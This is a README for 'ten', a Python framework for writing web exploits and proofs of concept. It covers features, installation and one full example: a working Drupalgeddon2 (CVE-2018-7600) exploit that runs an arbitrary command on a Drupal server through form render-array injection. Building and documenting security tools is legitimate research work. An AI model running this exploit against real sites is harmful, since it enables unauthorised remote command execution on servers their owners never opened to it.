# ten

My (small) web exploit framework. I got tired of writing standard code over and over again,
so I made this. Makes code more concise, clearer, faster to write. Might be useful to you.

It helps with HTTP interactions, handling user input, providing clear output, handling files, and running shell commands.

Useful to build POCs, and convert them into full, documented exploits in a blink.

# Documentation

Documentation is available here: [https://cfreal.github.io/ten/](https://cfreal.github.io/ten/).

It includes tutorials, quickstart guides, and the Python documentation.

# Features

* Input/output
    * Arguments to the main function are automatically mapped to `argparse`
        * They can hold a default value, get documented, etc.
    * Output is clear and readable
* HTTP
    * Improves the standard `requests` API
    * Parse HTTP responses easily (regex, CSS selectors, forms)
    * Turn BURP on and off in a blink
    * Concurrency
    * Lots more.
* Data conversion
    * Transform data: base64, hashing, query string, CSV, JSON, ...
    * Available as a tool: `tf`
* ...


# Installation

First clone the repository and cd into it:

```
$ git clone https://github.com/cfreal/ten.git
$ cd ten
```

**ten** can be installed from source using *pip* or *poetry*. It requires Python 3.10 or higher.

Use *poetry* to create a virtual environment and install the package: 

```
$ poetry install
$ poetry shell
```

If you're feeling adventurous, you can also install it with *pip*. This enables the `ten` and `tf` commands system-wide:

```
$ pip install .
```

# Example

Functional, fully documented Drupalgeddon2 exploit:

```python
#!/usr/bin/env python3

from ten import *


@entry
@arg("url", "URL of the Drupal website to exploit")
@arg("command", "Command to run on the server. Defaults to `id`")
def main(url, command="id"):
    """Exploit for Drupalgeddon2 (CVE-2018-7600)."""

    session = ScopedSession(url)
    response = session.post(
        url,
        params={
            "q": "user/password",
            "name[#post_render][]": "passthru",
            "name[#markup]": command,
            "name[#type]": "markup",
        },
        data={"form_id": "user_pass", "_triggering_element_name": "name"},
    )
    try:
        form = response.form(id="user_pass")
    except FormNotFoundError:
        failure("Unable to find form in response")
    
    build_id = form["form_build_id"]
    response = session.post(
        url,
        params={
            "q": f"file/ajax/name/#value/{build_id}"
        },
        data={"form_build_id": build_id},
    )
    result = response.re.search(r"^(.*)\[{", flags=re.S)
    
    assume(result, "Unable to find command result in response")

    msg_success("Exploit done")
    msg_info("Command result:")

    msg_print(result.group(1))


main()
```
